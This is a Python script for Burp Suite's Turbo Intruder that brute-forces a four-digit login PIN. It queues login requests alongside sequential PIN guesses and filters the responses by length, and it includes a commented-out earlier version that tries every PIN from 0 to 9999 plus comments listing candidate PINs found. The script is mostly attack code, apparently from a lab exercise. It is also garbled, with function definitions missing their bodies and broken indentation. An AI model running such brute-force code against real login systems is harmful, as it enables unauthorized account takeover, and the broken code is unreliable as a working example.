
import time

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=5,
                           engine=Engine.BURP, # Use Burp's HTTP/1 network stack, including upstream proxies etc. You can also use Engine.BURP2 for HTTP/2.
                           pipeline=False
                           )

def login1




def login2
                           
          
                          
                          
                          
    pin=700
    for i in range(5000):
 #5000 is for 2 tries per iteration to bruteforce 4 num digits
        engine.queue(target.req, login1) #login 1
        
        engine.queue(target.req, login2)

        
        
        
        guess = str(pin).zfill(4)
        engine.queue(target.req, guess)
        pin += 1
        guess = str(pin).zfill(4)
        engine.queue(target.req, guess)


def handleResponse(req, interesting):
#    @FilterSize(3230)
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.length != 3417:
        table.add(req)

#0644
#0727
#0728









# #worked with burp Macro and Session handling - but very slow

# def queueRequests(target, wordlists):
#     engine = RequestEngine(endpoint=target.endpoint,
#                            concurrentConnections=1,
#                            requestsPerConnection=1000,
#                            engine=Engine.BURP, # Use Burp's HTTP/1 network stack, including upstream proxies etc. You can also use Engine.BURP2 for HTTP/2.
#                            pipeline=False
#                            )

#     for pin in range(0,9999):
#         guess = str(pin).zfill(4)
#         engine.queue(target.req, guess)


# def handleResponse(req, interesting):
#     # currently available attributes are req.status, req.wordcount, req.length and req.response
#     if req.status != 404:
#         table.add(req)
